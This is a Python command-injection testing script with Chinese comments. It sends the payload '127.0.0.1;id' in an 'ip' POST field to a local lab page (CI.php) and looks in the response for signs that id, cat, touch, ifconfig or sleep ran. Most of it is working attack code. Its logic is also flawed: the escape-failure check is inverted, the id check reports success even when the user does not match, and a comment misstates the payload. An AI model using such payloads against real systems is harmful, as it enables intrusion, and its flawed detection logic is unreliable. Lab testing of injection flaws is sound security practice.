import requests
import re
# 检测指标
ls_check = "index"
cat_check = "get_target_info"
id_check_user="www-data"
touch_check="target.txt"
error_check_mode="easy"
# 目标 URL
url = "http://127.0.0.1/CI.php"

# 要注入的载荷，例如命令注入攻击的字符串
payload = "127.0.0.1;id"  # 注入命令，尝试执行 'ls' 命令

# POST 请求的数据
inject_var="ip"

# 检测ls注入成功的标志


def detect_success_ls(response_text):
    # 检查返回的内容中是否包含 'index'
    if ls_check in response_text:
        print(f"Command injection successful! 'ls' command executed and {ls_check} found.")
        return True
    else:
        # print("'ls' command did not return 'index.php'.")
        return False


def detect_success_id(response_text):
    """
    检测 'id' 命令是否执行成功，并检查返回结果中是否包含特定用户名

    :param response_text: 从服务器返回的响应文本
    :return: True 表示成功注入并找到指定用户，False 表示未找到
    """
    # 将 response_text 转换为小写以便进行不区分大小写的搜索
    response_text_lower = response_text.lower()

    # 定义正确的 id 命令返回格式的关键字
    expected_user = id_check_user 

    # 定义匹配 'id' 命令典型输出格式的关键字
    if "uid=" in response_text_lower and "gid=" in response_text_lower and "groups=" in response_text_lower:
        # 检查用户名是否是 CI
        if expected_user in response_text_lower:
            print("Command injection successful! 'id' command executed and correct found.")
            return True
        else:
            print("'id' command executed but target user not found in the result.")
            return True
    else:
        # print("'id' command did not return the expected format.")
        return False


def detect_success_cat(response_text):
    # 检查返回的内容中是否包含指定内容
    if cat_check in response_text:
        print(f"Command injection successful! 'cat' command executed and {cat_check} found.")
        return True
    else:
        # print("'cat' command did not return 'get_target_info'.")
        return False


def detect_success_touch(response_text):
    # 检查返回的内容中是否包含目标文件被创建的结果
    if f"File '{touch_check}' has been created!" in response_text:
        print("Command injection successful! 'touch' command executed.")
        return True
    else:
        # print("'touch' command failed.")
        return False


def detect_success_ifconfig(response_text):
    # 检查返回内容中是否包含 ifconfig 输出的典型信息
    if "inet " in response_text or "eth0" in response_text or "RX packets" in response_text:
        print("Command injection successful! 'ifconfig' output detected in the response.")
        return True
    else:
        # print("No 'ifconfig' output detected in the response.")
        return False


def detect_syntax_error(response_text):
    # 检测是否包含语法错误相关的内容。
    # 定义一些常见的语法错误提示关键字
    if error_check_mode == "hard":
        error_keywords = [
            # 语法错误提示
            "syntax error near unexpected token",  # 常见的 Bash 语法错误
            "syntax error: unexpected end of file",  # 未预期的文件末尾
            "syntax error: operand expected",  # 缺少操作数
            "bash: syntax error",  # Bash 提示语法错误
            "sh: syntax error",  # sh 提示语法错误
            "unexpected token",  # 未预期的字符
            "unexpected end of file",  # 未预期的文件末尾
            "unexpected operator",  # 未预期的操作符
            "unexpected argument",  # 未预期的参数
            "unexpected EOF while looking for matching",  # 未终止的 EOF
            "unterminated quoted string",  # 未终止的字符串
            "unterminated string",  # 未终止的字符串
            "unterminated character class",  # 未终止的字符类
            "unterminated comment",  # 未终止的注释
            "parse error",  # 解析错误
            "error parsing",  # 解析时出现错误
            "parse error near",  # 解析错误提示

            # 命令错误提示
            "command not found",  # 命令未找到
            "no such file or directory",  # 文件或目录不存在
            "permission denied",  # 权限不足

            # 其他错误提示
            "operation not permitted",  # 操作不允许
            "illegal option",  # 非法选项
            "too many arguments",  # 参数过多
            "is not recognized as an internal or external command"  # Windows 下的命令未找到错误提示
        ]
    else:
        error_keywords=["error","unexpected","not found","failure","denied","not permitted","no such file or directory","illegal"]
    # 将响应文本转换为小写以便进行不区分大小写的搜索
    response_text_lower = response_text.lower()

    # 遍历所有错误关键字，检查是否出现在响应文本中
    for keyword in error_keywords:
        if keyword in response_text_lower:
            return "syntaxerror"  # 如果找到错误提示，返回 'syntaxerror'

    return "true"  # 如果没有发现任何错误提示，返回 'true'


def detect_success_sleep(response_text):
    # 检测sleep 注入成功的提示 (执行时间大于指定阈值)
    # 预设了几种时间表达形式，实际靶场只有一种

    # 定义时间阈值（秒），超过该阈值认为 sleep 注入成功
    TIME_THRESHOLD = 5

    # 使用正则表达式检测类似于 'Execution time: X seconds' 或 'Elapsed time: Xs' 的时间提示
    time_patterns = [
        # 匹配 'Execution time: X seconds'
        r"execution time:\s*(\d+\.\d+)\s*seconds",
        r"elapsed time:\s*(\d+\.\d+)\s*s",  # 匹配 'Elapsed time: Xs'
        r"time taken:\s*(\d+\.\d+)\s*seconds"  # 匹配 'Time taken: X seconds'
    ]
    # 将 response_text 转为小写，便于匹配
    response_text_lower = response_text.lower()

    # 遍历所有的时间正则表达式
    for pattern in time_patterns:
        match = re.search(pattern, response_text_lower)
        if match:
            # 提取匹配到的执行时间（转换为浮点数）
            execution_time = float(match.group(1))
            # 如果执行时间超过设定的阈值，返回 True 表示 sleep 注入成功
            if execution_time >= TIME_THRESHOLD:
                return True

    # 如果没有匹配到任何超过阈值的时间，返回 False
    return False

def detect_escape_failure(response_text):
    # 检查返回内容是否包含逃逸检测失败的提示
    if "escap failure " in response_text :
        print("Command injection failed! payload failed escaping dectecting.")
        return False
    else:
        return True

def perform_injection(url, data):
    """
    执行注入操作，将生成的字符串注入到指定的 URL。

    :param url: 要注入的目标 URL
    :param data: 要注入的数据字符串
    :return: 注入结果 'true', 'false', 或 'syntaxerror',或‘failedescaping’
    """
    try:

        # 使用 POST 请求将数据发送到指定的 URL
        response = requests.post(url, data={inject_var:data})

        # 获取服务器返回的响应文本
        response_text = response.text
        # print(response_text)

        # 检测是否成功执行了 sleep 命令
        if detect_success_sleep(response_text):
            return "true"
        # 检测是否成功执行了 id 命令
        if detect_success_id(response_text):
            return "true"
        if detect_success_cat(response_text):
            return "true"
        if detect_success_touch(response_text):
            return "true"
        if detect_success_ifconfig(response_text):
            return "true"
        if detect_escape_failure(response_text):
            return "failedescaping"
        # 检测是否存在语法错误
        if detect_syntax_error(response_text) == "syntaxerror":
            return "syntaxerror"
        # 默认返回 'false'
        return "false"

    except requests.RequestException as e:
        print(f"Error during the injection request: {e}")
        return "false"
